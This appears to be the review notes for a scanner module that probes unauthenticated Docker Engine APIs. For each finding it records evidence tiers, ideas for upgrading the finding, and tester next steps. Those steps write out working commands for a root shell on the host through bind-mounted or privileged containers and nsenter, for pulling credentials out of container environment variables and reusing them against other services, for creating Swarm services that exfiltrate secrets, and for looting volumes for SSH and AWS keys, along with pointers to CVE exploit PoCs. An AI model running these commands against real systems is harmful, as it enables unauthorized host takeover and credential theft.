summary: Very mature module: unauthenticated Docker Engine API read produces per-container escape enablers, env-secret extraction, Swarm secret/config names, and version-gated engine + runc CVEs. Reads deep (inspect every container) but explicitly avoids the container-create RCE. Biggest gap: no automated proof of the escape (spawning a canary alpine container mounting /host and reading a benign file back), and no attempt to reuse discovered env secrets against any second service.

findings.title_pattern: Docker Engine API exposed without authentication
findings.tier_evidence: Anon GET /version + /info returning 200 JSON is deterministic proof the daemon is unauth-exposed; the RCE path is documented but never launched.
findings.promotion_notes: POST /containers/create with a benign image bind-mounting /:/host readonly, /containers/{id}/start, /containers/{id}/exec with 'id;hostname;cat /etc/hostname' — capture output as proof of root-on-host without persisting anything. Delete container on teardown.
findings.tester_next_step: docker -H http://<ip>:2375 run --rm -v /:/host -it alpine chroot /host sh — root shell on host. Or curl -s http://<ip>:2375/containers/json to enumerate then POST /containers/create with a bind for a full escape.

findings.tier_evidence: GET /containers/json + /images/json returning 200 lists is direct proof of unauth workload disclosure.
findings.promotion_notes: Iterate containers, `docker inspect` env, docker cp /root/.aws /tmp, then reuse extracted AWS keys against sts:GetCallerIdentity. Already partly done in docker_env_secrets.
findings.tester_next_step: docker -H http://<ip>:2375 ps -a; docker -H ... inspect <id> | jq '.[].Config.Env' — mine every env for creds and mounted volumes for known secret paths (~/.aws, ~/.kube, ~/.ssh).

findings.title_pattern: Docker container env-var credentials readable unauthenticated
findings.tier_evidence: Actual credential-shaped env values are read out of /containers/{id}/json Config.Env and returned as loot with preview — ready-to-reuse credentials in hand.
findings.promotion_notes: Feed extracted DB URIs into the db/* modules (mongodb, postgres, mysql, redis) — already-scanned targets; feed AWS keys into a cloud metadata dance. Wire into shared known_users / known_creds pool.
findings.tester_next_step: docker -H http://<ip>:2375 inspect $(docker -H ... ps -q) | jq -r '.[].Config.Env[]' | grep -Ei 'PASS|KEY|TOKEN|URL' — try each credential against services on the same host or reachable ranges.

findings.title_pattern: Docker containers with host-mount / privileged escape route
findings.tier_evidence: Enumerated from HostConfig via unauth inspect — the presence of /:/host bind or Privileged=true is deterministic evidence a container is an escape primitive.
findings.promotion_notes: docker exec into an existing privileged container and read a canary file on the host — no need to spawn one. Non-destructive proof.
findings.tester_next_step: docker -H ... exec -it <priv_container_id> nsenter -t 1 -m -u -i -n -p sh — full host root via existing container; or chroot /host if a /:/host bind exists.

findings.title_pattern: Docker containers with namespace / capability escape enablers
findings.tier_evidence: Namespace/cap/secopt/device settings pulled from inspect are self-declared proof of the escape primitive, but recce doesn't attempt the escape itself.
findings.promotion_notes: docker exec into a SYS_ADMIN or PID=host container and use nsenter/mount to read a host file. Or exec into an apparmor=unconfined container and issue a mount() syscall to prove the sandbox is off.
findings.tester_next_step: docker -H ... exec <container_id> nsenter -t 1 -m -u -i -n -p /bin/sh — if PidMode=host or SYS_ADMIN present. For seccomp=unconfined: docker exec <c> unshare -Ur sh — check for CAP_SYS_ADMIN behaviors.

findings.title_pattern: Docker Engine CVE-2024-41110 (Docker Engine AuthZ plugin bypass)
findings.tier_evidence: Emitted from ServerVersion string alone — pure version-range banner match, no probe of the CVE itself.
findings.promotion_notes: For CVE-2024-41110: craft the AuthZ-bypass request (empty body + Content-Length: 0) against a policy-restricted endpoint and observe it succeeds — requires an AuthZ plugin to be present, which is not directly detectable here.
findings.tester_next_step: docker -H <sch>://<ip>:2375 version; if ServerVersion < 23.0.14 / 26.1.4 / 27.1.0 and daemon has an authz plugin, PoC at https://github.com/AbsoZed/CVE-2024-41110 sends header-only requests to bypass plugin checks.

findings.tier_evidence: Version-range match against RuncCommit.ID only — no probe of the escape itself.
findings.promotion_notes: CVE-2019-5736: attempt a controlled 'runc exec' into a container that writes to /proc/self/exe (dangerous, will overwrite the host runc). Not appropriate as automated probe.
findings.tester_next_step: docker -H http://<ip>:2375 info --format '{{.RuncCommit.ID}}'; for CVE-2024-21626 PoC see leaked-fd escape at https://github.com/NitroCao/CVE-2024-21626 — run only in ROE, has host-corruption side-effects.

findings.tier_evidence: GET /secrets and /configs returning names is deterministic proof of Swarm manager exposure; values are not retrieved (they require a task mount).
findings.promotion_notes: POST /services/create with a hostile task that mounts the named secrets and exfiltrates them (e.g., writes to a bind-mount or does a callback). Destructive on the cluster.
findings.tester_next_step: docker -H ... secret ls; docker -H ... service create --name pwn --secret db_password alpine sleep 3600; then docker -H ... exec pwn cat /run/secrets/db_password to exfiltrate.

findings.tier_evidence: Just names from /volumes — attack-surface data, no vuln evidence.
findings.promotion_notes: Bind a volume into a probe container and search for known credential paths (.aws/credentials, id_rsa) — but requires container-create.
findings.tester_next_step: docker -H ... volume ls; docker -H ... run --rm -v <vol>:/loot alpine find /loot -type f — look for id_rsa, credentials, .env.
